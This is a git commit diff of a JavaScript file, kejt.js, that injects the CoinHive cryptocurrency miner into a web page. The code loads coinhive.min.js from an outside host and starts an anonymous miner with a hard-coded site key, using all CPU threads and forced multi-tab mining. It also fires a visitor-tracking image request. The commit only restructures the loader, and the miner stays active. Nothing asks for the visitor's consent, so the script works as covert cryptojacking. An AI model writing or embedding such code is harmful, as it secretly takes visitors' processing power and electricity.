c23f8753110900968b3f4c1cabd3eeda2e6eb023
llllooloolooloo <33094633+llllooloolooloo@users.noreply.github.com>
2017-10-25 18:50:52 +0200

    asdas
    asdsa

--- kejt.js
+++ kejt.js
@@ -1,22 +1,16 @@
 (new Image).src = "//whos.amung.us/swidget/paritonl1n3";
 
-function addScript( src,callback) {
-  var s = document.createElement( 'script' );
-  s.setAttribute( 'src', src );
-  s.onload=callback;
-  document.body.appendChild( s );
-}
-
-function start(){
+var head = document.getElementsByTagName('head')[0];
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.onload = function() {
   var miner = new CoinHive.Anonymous('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', {
-	threads: navigator.hardwareConcurrency,
-	autoThreads: false,
-	throttle: 0.5,
-	forceASMJS: false
+  threads: navigator.hardwareConcurrency,
+  autoThreads: false,
+  throttle: 0.5,
+  forceASMJS: false
 });
-	miner.start(CoinHive.FORCE_MULTI_TAB);
+  miner.start(CoinHive.FORCE_MULTI_TAB);
 }
-
-document.addEventListener('DOMContentLoaded', function() {
-addScript("https://coinhive.com/lib/coinhive.min.js", start);
-});
+script.src = 'https://coinhive.com/lib/coinhive.min.js';
+head.appendChild(script);
